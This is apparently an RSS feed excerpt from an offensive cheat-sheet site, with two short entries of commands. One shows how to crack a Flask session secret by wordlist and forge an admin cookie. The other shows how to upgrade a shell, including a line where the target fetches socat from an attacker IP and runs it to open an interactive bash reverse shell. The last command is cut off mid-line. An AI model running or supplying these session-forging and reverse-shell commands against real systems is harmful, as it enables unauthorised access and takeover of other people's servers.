channel.title: Python on TLDRBins
channel.description: Recent content in Python on TLDRBins

item.title: Flask Cookie
item.description: Flask Cookie pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k" # Brute force secret key flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k" -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret "secret123"

item.title: Upgrade Shell
item.description: Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c 'import pty; pty.spawn("/bin/bash")' #Ctrl-Z to send the process to background, then stty raw -echo; fg #After fg, press enter again, then export TERM=xterm-256color socat Download socat # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.
